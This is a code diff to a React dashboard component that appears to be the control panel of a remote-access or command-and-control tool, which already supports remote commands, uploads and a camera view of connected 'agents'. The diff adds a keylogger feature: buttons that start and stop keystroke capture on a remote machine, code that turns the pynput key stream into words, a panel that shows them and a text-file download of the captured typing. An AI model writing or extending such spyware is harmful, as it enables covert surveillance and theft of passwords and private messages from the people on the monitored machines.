@@ -22,6 +22,9 @@ export default function AgentTerminal({ agent, onClose }: Props) {
   const [interactive, setInteractive] = useState(false)
   const [icmd, setIcmd] = useState('')
   const [activeTab, setActiveTab] = useState<'remote' | 'camera'>('remote')
+  const [showKeylog, setShowKeylog] = useState(false)
+  const [keylog, setKeylog] = useState<string[]>([])
+  const keyBufRef = useRef<string>("")
   const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || 'http://localhost:9000'
   const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
 
@@ -92,6 +95,32 @@ export default function AgentTerminal({ agent, onClose }: Props) {
   }, [agent.agent_id])
 
   useEffect(() => {
+    const onLine = (raw: string) => {
+      const s = String(raw || '')
+      // Normalize pynput repr: e.g., "'d'", "Key.space", "Key.enter"
+      const isSpecial = s.startsWith('Key.')
+      if (isSpecial) {
+        if (s === 'Key.space') {
+          const w = keyBufRef.current.trim()
+          if (w) setKeylog((prev) => [...prev, w])
+          keyBufRef.current = ''
+        } else if (s === 'Key.enter') {
+          const w = keyBufRef.current.trim()
+          if (w) setKeylog((prev) => [...prev, w])
+          keyBufRef.current = ''
+        }
+        return
+      }
+      // Single char like "'d'"
+      const m = s.match(/^'(.*)'$/)
+      const ch = m ? m[1] : s
+      keyBufRef.current += ch
+    }
+    dashboardSocket.onKeylog(agent.agent_id, onLine)
+    return () => dashboardSocket.offKeylog(agent.agent_id, onLine)
+  }, [agent.agent_id])
+
+  useEffect(() => {
     const onExit = (code: number) => {
       const lc = (lastCmdRef.current || '').trim().toLowerCase()
       if (code === 0 && (lc === 'cd' || lc.startsWith('cd ') || lc.startsWith('chdir '))) {
@@ -146,6 +175,7 @@ export default function AgentTerminal({ agent, onClose }: Props) {
           <button className="btn secondary" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
           <button className="btn" onClick={triggerUpload} disabled={uploading}>{uploading ? 'Uploading...' : 'Upload'}</button>
+          <button className="btn secondary" onClick={() => { if (!showKeylog) { dashboardSocket.startKeylog(agent.agent_id) } else { dashboardSocket.stopKeylog(agent.agent_id) } ; setShowKeylog(!showKeylog) }}>{showKeylog ? 'Stop Keylog' : 'Start Keylog'}</button>
           <input ref={uploadRef} type="file" style={{ display: 'none' }} onChange={onUpload} />
           <input className="input" placeholder="Interactive command (e.g., python game.py)" value={icmd} onChange={(e) => setIcmd(e.target.value)} style={{ width: 260 }} />
           {!interactive ? (
@@ -200,6 +230,23 @@ export default function AgentTerminal({ agent, onClose }: Props) {
         />
         <button className="btn" onClick={send}>Send</button>
       </div>
+      {showKeylog && (
+        <div className="card" style={{ marginTop: 8 }}>
+          <h4 style={{ margin: '0 0 6px', color: '#9efc9e', fontSize: 14 }}>Keylog</h4>
+          <div style={{ display: 'flex', gap: 8, marginBottom: 6 }}>
+            <button className="btn secondary" onClick={() => {
+              const blob = new Blob([keylog.join('\n') + '\n'], { type: 'text/plain;charset=utf-8' })
+              const url = URL.createObjectURL(blob)
+              const a = document.createElement('a'); a.href = url; a.download = `keylog-${agent.agent_id}-${Date.now()}.txt`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
+            }}>Download TXT</button>
+            <button className="btn secondary" onClick={() => { setKeylog([]); keyBufRef.current=''; }}>Clear</button>
+          </div>
+          <div style={{ maxHeight: 200, overflow: 'auto', background: '#111', border: '1px solid #222', borderRadius: 6, padding: 8 }}>
+            {keylog.map((l, i) => (<div key={i} style={{ color: '#bbb', fontSize: 12 }}>{l}</div>))}
+            {keylog.length === 0 && (<div style={{ color: '#555', fontSize: 12 }}>(no events)</div>)}
+          </div>
+        </div>
+      )}
       <div style={{ marginTop: 8 }}>
         <h4 style={{ margin: '0 0 6px', color: '#9efc9e', fontSize: 14 }}>Current Directory Files</h4>
         <div style={{ display: 'grid', gridTemplateColumns: '1fr auto auto auto', gap: 6 }}>
